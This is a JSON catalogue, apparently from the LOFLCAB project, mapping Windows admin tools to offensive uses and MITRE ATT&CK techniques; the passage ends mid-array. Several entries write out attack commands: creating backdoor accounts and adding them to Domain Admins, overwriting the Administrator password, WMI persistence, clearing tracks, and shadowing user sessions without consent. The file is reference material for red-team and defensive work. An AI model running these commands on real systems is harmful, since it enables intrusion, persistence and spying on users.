[{
"Type":"Binaries","Name":"AccessEnum.exe","Description":"Displays who has access to items within a directory or registry key","Updated":"2023-07-01","Toolsets":["GUI","Sysinternals"],"Commands":[{"Command":"AccessEnum.exe","Description":"Enumerate share permissions","Usecases":["Identify writable files and folders on a share which can be backdoored"],"Function":"Data","Comments":["Share first needs to be mounted to the local system as a drive; AccessEnum does not support scanning network shares"],"MitreAttack":["T1083"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/AccessEnum/"},{
"Type":"Binaries","Name":"Microsoft.ConfigurationManagement.exe","Description":"Microsoft Configuration Manager (MCM)","Updated":"2023-11-04","Toolsets":["Extra","GUI"],"Commands":[{"Command":"\"C:\\Program Files (x86)\\Microsoft Endpoint Manager\\AdminConsole\\bin\\Microsoft.ConfigurationManagement.exe\"","Description":"Manage Microsoft Configuration Manager (MCM)","Usecases":["Collect information about systems","Deploy software implant to system"],"Function":"Manage","Comments":["Download software, including Configuration Manager console on reference 1","Installation instructions on reference 2","At the Microsoft Configuration main screen, choose \"Install Configuration Manager console\"","Add the `SMS:DebugView` parameter to the commandline to get an additional option (Tools) in the menu","Formerly known as System Center Configuration Manager (SCCM)"],"MitreAttack":null}],"Resources":["https://www.microsoft.com/en-us/evalcenter/download-microsoft-endpoint-configuration-manager","https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/install/install-consoles","https://http418infosec.com/offensive-sccm-summary"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/Microsoft.ConfigurationManagement/"},{
"Type":"Binaries","Name":"RDCMan.exe","Description":"Remote Desktop Connection Manager","Updated":"2024-12-13","Toolsets":["GUI","Sysinternals"],"Commands":[{"Command":"RDCMan.exe","Description":"Remote Desktop","Usecases":null,"Function":"Sessions","Comments":["Session -> Connect To (Ctrl + Q) -> Enter server name","See also [mstsc.exe](../mstsc)"],"MitreAttack":["T1021.001"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/RDCMan/"},{
"Type":"Binaries","Name":"ServerManager.exe","Description":"Manage roles and features on servers in the domain","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"ServerManager.exe","Description":"Server Manager","Usecases":["Manage roles and features on servers"],"Function":"Manage","Comments":["Add other servers to manage -> DNS -> `DC1.ad.bitsadmin.com` -> Enter -> Arrow -> OK"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"5985/TCP"},{"Port":"5986/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/ServerManager/"},{
"Type":"Binaries","Name":"SmeDesktop.exe","Description":"Windows Admin Center","Updated":"2023-08-25","Toolsets":["Extra","GUI"],"Commands":[{"Command":"\"C:\\Program Files\\Windows Admin Center\\SmeDesktop.exe\"","Description":"Manage machines","Usecases":["Manage Certificates, Devices, Events, Files & file sharing, Firewall, Installed apps, Local users & groups, Networks, Performance Monitor, PowerShell, Processes, Registry, Remote Desktop, Roles & features, Scheduled tasks, Services, Storage, Storage Migration Service, Storage Replica, System Insights and Updates"],"Function":"Manage","Comments":["Download and install Windows Admin Center and install it","Underlying extensively uses WinRM"],"MitreAttack":null}],"Resources":["https://www.microsoft.com/evalcenter/download-windows-admin-center"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/SmeDesktop/"},{
"Type":"Binaries","Name":"Ssms.exe","Description":"SQL Server Management Studio (SSMS)","Updated":"2023-11-04","Toolsets":["Extra","GUI"],"Commands":[{"Command":"\"C:\\Program Files (x86)\\Microsoft SQL Server Management Studio 19\\Common7\\IDE\\Ssms.exe\"","Description":"SQL Server Management Studio (SSMS)","Usecases":["Connect to MSSQL database and execute commands on the underlying OS using the `xp_cmdshell` stored procedure, execute CLR code or pivot over MSSQL server links"],"Function":"Manage","Comments":["Download link in resources","See also [SQLServerManager15.msc](../../MMC/SQLServerManager15)"],"MitreAttack":null}],"Resources":["https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/Ssms/"},{
"Type":"Binaries","Name":"TpmVscMgr.exe","Description":"Create and delete TPM virtual smart cards","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"TpmVscMgr.exe create /machine W11.ad.bitsadmin.com /name MyVSC /pin default /adminkey random /generate","Description":"Create virtual smart card","Usecases":null,"Function":"Misc","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/TpmVscMgr/"},{
"Type":"Binaries","Name":"WinAppDeployCmd.exe","Description":"Deploy a Universal Windows Platform (UWP) app to any Windows 10 device","Updated":"2023-07-01","Toolsets":["Extra"],"Commands":[{"Command":"WinAppDeployCmd.exe list -ip 10.0.10.51","Description":"Show the list of installed UWP apps","Usecases":null,"Function":"Manage","Comments":["Part of the Windows 10 SDK"],"MitreAttack":null}],"Resources":["https://learn.microsoft.com/en-us/windows/uwp/packaging/install-universal-windows-apps-with-the-winappdeploycmd-tool"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/WinAppDeployCmd/"},{
"Type":"Binaries","Name":"adexplorer.exe","Description":"Advanced Active Directory (AD) viewer and editor","Updated":"2023-08-25","Toolsets":["GUI","Sysinternals"],"Commands":[{"Command":"adexplorer.exe","Description":"Interactively browse LDAP","Usecases":["Via File -> Connect, connect to a domain controller","If adexplorer is running in the context of a domain, the \"Connect to\" field can be left empty as it automatically connects to a DC of the current domain","When User and Password fields are left empty, Kerberos authentication is used"],"Function":"Domain","Comments":null,"MitreAttack":null},{"Command":"adexplorer.exe -snapshot ad.bitsadmin.com:636 ad.bitsadmin.com.dat","Description":"Obtain dump of Active Directory over TLS","Usecases":["Offline evaluation of the AD to identify vulnerabilities and attack paths"],"Function":"Domain","Comments":["Can be viewed offline using ADExplorer","Can also be imported to BloodHound format using ADExplorerSnapshot.py or to Adalanche (see references)"],"MitreAttack":null}],"Resources":["https://blog.bitsadmin.com/dealing-with-large-bloodhound-datasets","https://github.com/c3c/ADExplorerSnapshot.py","https://github.com/lkarlslund/Adalanche"],"Detections":[{"Port":"389/TCP"},{"Port":"636/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/adexplorer/"},{
"Type":"Binaries","Name":"adrestore.exe","Description":"Enumerates deleted (tombstoned) objects in a domain and gives you the option of restoring each one","Updated":"2023-07-01","Toolsets":["Sysinternals","TODO"],"Commands":[{"Command":"adrestore.exe","Description":"TODO","Usecases":null,"Function":"Domain","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/adrestore/"},{
"Type":"Binaries","Name":"at.exe","Description":"Schedules commands and programs to run on a computer at a specified time and date","Updated":"2023-11-04","Toolsets":["Builtin"],"Commands":[{"Command":"at.exe \\\\W10.ad.bitsadmin.com 06:00 cmd /c \"net user Hacker H4ck#rt /add & net localgroup Administrators Hacker /add\"","Description":"Execute task","Usecases":["Create backdoor user or launch implant"],"Function":"Execute","Comments":["Deprecated in favor of [schtasks.exe](../schtasks)"],"MitreAttack":["T1053.002"]},{"Command":"at.exe \\\\W10.ad.bitsadmin.com","Description":"List tasks","Usecases":["List current tasks to identify a name that can be used for a new task to blend in"],"Function":"Recon","Comments":null,"MitreAttack":["T1053.002"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/at/"},{
"Type":"Binaries","Name":"csvde.exe","Description":"Imports and exports data from Active Directory Domain Services (AD DS) using files that store data in the comma-separated value (CSV) format","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"csvde.exe -m -f users.csv -s DC1.ad.bitsadmin.com -d \"cn=users,DC=ad,DC=bitsadmin,DC=com\" -r \"(objectClass=user)\"","Description":"Query all users","Usecases":["Query LDAP over the commandline"],"Function":"Domain","Comments":["Not sure if built-in"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/csvde/"},{
"Type":"Binaries","Name":"cusrmgr.exe","Description":"Manage local user accounts","Updated":"2023-07-01","Toolsets":["Extra"],"Commands":[{"Command":"cusrmgr.exe -u TargetUser -P Password1! -m \\\\W10.ad.bitsadmin.com","Description":"Update password","Usecases":["Backdoor account"],"Function":"Manage","Comments":["Part of the Windows 2000 Resource Kit"],"MitreAttack":null},{"Command":"cusrmgr.exe -u TargetUser -alg Administrators -m \\\\W10.ad.bitsadmin.com","Description":"Add user to local Administrators group","Usecases":["Backdoor account"],"Function":"Manage","Comments":["Part of the Windows 2000 Resource Kit"],"MitreAttack":null},{"Command":"cusrmgr.exe -u TargetUser -d -m \\\\W10.ad.bitsadmin.com","Description":"Delete user","Usecases":["Clear tracks"],"Function":"Manage","Comments":["Part of the Windows 2000 Resource Kit"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/cusrmgr/"},{
"Type":"Binaries","Name":"dcdiag.exe","Description":"Directory Server Diagnosis","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"dcdiag.exe","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["Not sure if part of RSAT or not"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/dcdiag/"},{
"Type":"Binaries","Name":"devcon.exe","Description":"Displays detailed information about devices","Updated":"2023-07-01","Toolsets":["Extra"],"Commands":[{"Command":"devcon.exe -m:\\\\W10.ad.bitsadmin.com find *","Description":"List drivers","Usecases":["Identify drivers of security solutions that are installed"],"Function":"Recon","Comments":["Part of Tools component of Windows Driver Kit (WDK)"],"MitreAttack":["TA0043"]}],"Resources":["https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/devcon/"},{
"Type":"Binaries","Name":"dfscmd.exe","Description":"Configures DFS folders and folder targets in a DFS namespace","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"dfscmd.exe","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Not sure if part of RSAT or not"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/dfscmd/"},{
"Type":"Binaries","Name":"dfsdiag.exe","Description":"Provides diagnostic information for DFS Namespaces","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"dfsdiag.exe","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Not sure if part of RSAT or not"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/dfsdiag/"},{
"Type":"Binaries","Name":"dfsrdiag.exe","Description":"DFS Replication operational and diagnostics command line utility","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"dfsrdiag.exe","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Not sure if part of RSAT or not"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/dfsrdiag/"},{
"Type":"Binaries","Name":"dfsutil.exe","Description":"Manage DFS Namespaces, servers, and clients","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"dfsutil.exe root \\\\ad.bitsadmin.com\\Users","Description":"List DFS servers of namespace","Usecases":null,"Function":"Data","Comments":["Obtains the information from the DC via port 445/TCP -> DCE/RPC -> Settings for Microsoft Distributed File System","Performs (many) resolves via DNS."],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/dfsutil/"},{
"Type":"Binaries","Name":"djoin.exe","Description":"Provision a computer account in the domain","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"djoin.exe /PROVISION /DOMAIN ad.bitsadmin.com /MACHINE hacker /SAVEFILE hacker.txt /DEFPWD /PRINTBLOB /NETBIOS hacker","Description":"Provision new computer account","Usecases":null,"Function":"Domain","Comments":["Not sure if part of RSAT or not"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/djoin/"},{
"Type":"Binaries","Name":"dnscmd.exe","Description":"Command-line interface for managing DNS servers","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"dnscmd.exe","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Not sure if part of RSAT or not"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/dnscmd/"},{
"Type":"Binaries","Name":"driverquery.exe","Description":"Display a list of installed device drivers","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"driverquery.exe /s W10.ad.bitsadmin.com","Description":"List drivers","Usecases":["Identify drivers of security solutions that are installed"],"Function":"Recon","Comments":null,"MitreAttack":["TA0043"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/driverquery/"},{
"Type":"Binaries","Name":"dsac.exe","Description":"Active Directory Administrative Center","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"dsac.exe","Description":"Active Directory Administrative Center","Usecases":["View user's BitLocker recovery passwords, reset user's passwords and modify security of objects and OUs"],"Function":"Domain","Comments":["Manage -> Add Navigation Nodes -> Connect to other domains -> Connect to: `ad.bitsadmin.com`","Needs to be executed from a OffensiveDC with a dummy domain (e.g. a Windows Server machine with a local `hacker.local` domain) in a `runas /netonly` context"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"389/UDP"},{"Port":"389/TCP"},{"Port":"9389/TCP"},{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/dsac/"},{
"Type":"Binaries","Name":"dsacls.exe","Description":"Displays or modifies permissions (ACLS) of an Active Directory Domain Services (AD DS) Object","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"dsacls.exe","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["Not sure if part of RSAT or not"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/dsacls/"},{
"Type":"Binaries","Name":"dsadd.exe","Description":"Add specific types of objects to the directory","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"dsadd.exe","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["Not sure if part of RSAT or not"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/dsadd/"},{
"Type":"Binaries","Name":"dsget.exe","Description":"Display the selected properties of a specific object in the directory","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"dsget.exe","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["Not sure if part of RSAT or not"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/dsget/"},{
"Type":"Binaries","Name":"dsmgmt.exe","Description":"Facilitates managing AD DS/LDS application partitions, management and control of the Flexible Single Master Operations (FSMO), and cleaning up of metadata left behind by abandoned AD DCs/LDS instances","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"dsmgmt.exe","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["Not sure if part of RSAT or not"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/dsmgmt/"},{
"Type":"Binaries","Name":"dsmod.exe","Description":"Modifies existing objects in the directory","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"dsmod.exe","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["Not sure if part of RSAT or not"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/dsmod/"},{
"Type":"Binaries","Name":"dsmove.exe","Description":"Moves or renames an object within the directory","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"dsmove.exe","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["Not sure if part of RSAT or not"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/dsmove/"},{
"Type":"Binaries","Name":"dsquery.exe","Description":"This tool's commands suite allow you to query the directory according to specified criteria. Each of the following dsquery commands finds objects of a specific object type, with the exception of dsquery *, which can query for any type of object","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"dsquery.exe","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["Not sure if part of RSAT or not"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/dsquery/"},{
"Type":"Binaries","Name":"dsrm.exe","Description":"Deletes objects from the directory","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"dsrm.exe","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["Not sure if part of RSAT or not"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/dsrm/"},{
"Type":"Binaries","Name":"eventcreate.exe","Description":"Create a custom event in a specified event log","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"eventcreate.exe /S W10.ad.bitsadmin.com /T Error /ID 100 /L Application /D \"Some description\"","Description":"Write error to Application event log","Usecases":null,"Function":"Logs","Comments":["No events can be written to the Security event log"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/eventcreate/"},{
"Type":"Binaries","Name":"finger.exe","Description":"Displays information about a user on a specified system running the Finger service","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"finger.exe","Description":"TODO","Usecases":null,"Function":"Network","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/finger/"},{
"Type":"Binaries","Name":"getmac.exe","Description":"Returns the media access control (MAC) address and list of network protocols associated with each address for all network cards in each computer","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"getmac.exe /V /S W10.ad.bitsadmin.com","Description":"List network adapters","Usecases":null,"Function":"Network","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/getmac/"},{
"Type":"Binaries","Name":"gpfixup.exe","Description":"Group Policy fix up utility","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"gpfixup.exe","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["Not sure if part of RSAT or not"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/gpfixup/"},{
"Type":"Binaries","Name":"gpresult.exe","Description":"Displays the Resultant Set of Policy (RSoP) information for a remote user and computer","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"gpresult.exe /S W10.ad.bitsadmin.com /SCOPE COMPUTER /X W10.xml","Description":"Save effective policies to XML","Usecases":["Understand group policies that are applicable"],"Function":"Recon","Comments":null,"MitreAttack":["TA0043"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/gpresult/"},{
"Type":"Binaries","Name":"ldifde.exe","Description":"LDIF Directory Exchange","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"ldifde.exe","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["Not sure if part of RSAT or not"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/ldifde/"},{
"Type":"Binaries","Name":"local.exe","Description":"Displays members of local groups on remote servers or domains","Updated":"2023-07-01","Toolsets":["Extra"],"Commands":[{"Command":"local.exe Administrators \\\\W10.ad.bitsadmin.com","Description":"List members of the Administrators group","Usecases":["Reconnaissance"],"Function":"Manage","Comments":["Part of the Windows 2000 Resource Kit"],"MitreAttack":null},{"Command":"local.exe \"Domain Admins\" ad.bitsadmin.com","Description":"List members of the \"Domain Admins\" group","Usecases":["Reconnaissance"],"Function":"Manage","Comments":["Part of the Windows 2000 Resource Kit"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/local/"},{
"Type":"Binaries","Name":"logman.exe","Description":"Creates and manages Event Trace Session and Performance logs and supports many functions of Performance Monitor from the command line","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"logman.exe query providers -s W10.ad.bitsadmin.com","Description":"List ETW providers","Usecases":["Identify ETW providers of security solutions that are installed, e.g. Sysinternals Sysmon's `Microsoft-Windows-Sysmon provider`"],"Function":"Logs","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/logman/"},{
"Type":"Binaries","Name":"logoff.exe","Description":"Terminates a session","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"logoff.exe rdp-tcp#0 /SERVER:W10.ad.bitsadmin.com","Description":"Logoff user","Usecases":["Force logoff of a user"],"Function":"Sessions","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/logoff/"},{
"Type":"Binaries","Name":"manage-bde.exe","Description":"BitLocker Drive Encryption Configuration Tool","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"manage-bde.exe -ComputerName W10.ad.bitsadmin.com","Description":"TODO","Usecases":null,"Function":"Data","Comments":null,"MitreAttack":["T1486"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/manage-bde/"},{
"Type":"Binaries","Name":"mofcomp.exe","Description":"Parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"mofcomp.exe -N:\\\\W10.ad.bitsadmin.com\\root\\subscription .\\backdoor.mof","Description":"Create persistence","Usecases":null,"Function":"Execute","Comments":null,"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/mofcomp/"},{
"Type":"Binaries","Name":"msg.exe","Description":"Send a message to a user","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"msg.exe","Description":"TODO","Usecases":null,"Function":"Sessions","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/msg/"},{
"Type":"Binaries","Name":"msinfo32.exe","Description":"Show system information","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"msinfo32.exe","Description":"System Information","Usecases":["Show system information"],"Function":"Recon","Comments":["View -> Remote Computer (Ctrl + R)"],"MitreAttack":["T1082"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/msinfo32/"},{
"Type":"Binaries","Name":"msra.exe","Description":"Windows Remote Assistance","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"msra.exe","Description":"TODO","Usecases":null,"Function":"Sessions","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/msra/"},{
"Type":"Binaries","Name":"mstsc.exe","Description":"Connect to the desktop of remote computers","Updated":"2024-12-13","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"mstsc.exe /v:SP2019.ad.bitsadmin.com /shadow:1 /noConsentPrompt /control","Description":"Control a user's session","Usecases":["Take over when a user is idle"],"Function":"Sessions","Comments":null,"MitreAttack":["T1021.001"]},{"Command":"mstsc.exe /remoteGuard /v:SP2019.ad.bitsadmin.com","Description":"Remote Desktop","Usecases":["Connect to a target server","Exfiltrate data over RDP clipboard or `\\\\tsclient` drives","If RDP provides access to a different network segment, SocksOverRDP can be used to pivot into that segment"],"Function":"Sessions","Comments":["See also [RDCMan.exe](../RDCMan)"],"MitreAttack":["T1021.001"]},{"Command":"mstsc.exe /v:SP2019.ad.bitsadmin.com /shadow:1 /noConsentPrompt","Description":"Shadow a user","Usecases":["Spy on a user's activity"],"Function":"Sessions","Comments":null,"MitreAttack":["T1021.001"]}],"Resources":["https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/mstsc/"},{
"Type":"Binaries","Name":"ndkping.exe","Description":"RDMA Ping Cmd","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"ndkping.exe","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Not sure what this is for"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/ndkping/"},{
"Type":"Binaries","Name":"net.exe","Description":"Functionalities related to querying and modifying the domain, services, shares and users","Updated":"2023-08-25","Toolsets":["Builtin"],"Commands":[{"Command":"net.exe view \\\\W10.ad.bitsadmin.com /all","Description":"List all shares","Usecases":["Identify all shares, including hidden ones to enumerate for sensitive information"],"Function":"Data","Comments":null,"MitreAttack":["T1135"]},{"Command":"net.exe view \\\\W10.ad.bitsadmin.com","Description":"List shares","Usecases":["Search for files on shares with credential material","Identify files that can be backdoored"],"Function":"Data","Comments":null,"MitreAttack":["T1135"]},{"Command":"net.exe time \\\\W10.ad.bitsadmin.com","Description":"Show time","Usecases":null,"Function":"Recon","Comments":null,"MitreAttack":["T1124"]},{"Command":"net.exe user backdoor Password1! /add /domain","Description":"Create new domain account","Usecases":["Add backdoor account to the domain"],"Function":"Domain","Comments":null,"MitreAttack":["T1136.002","T1078.002"]},{"Command":"net.exe user Administrator NewPassword1! /domain","Description":"Update password","Usecases":["Overwrite the password of a domain user"],"Function":"Domain","Comments":null,"MitreAttack":null},{"Command":"net.exe group \"Domain Admins\" backdoor /add /domain","Description":"Add user to domain group","Usecases":["Add user to the \"Domain Admins\" group"],"Function":"Domain","Comments":null,"MitreAttack":null}],"Resources":["https://blog.bitsadmin.com/digging-for-secrets"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/net/"},{
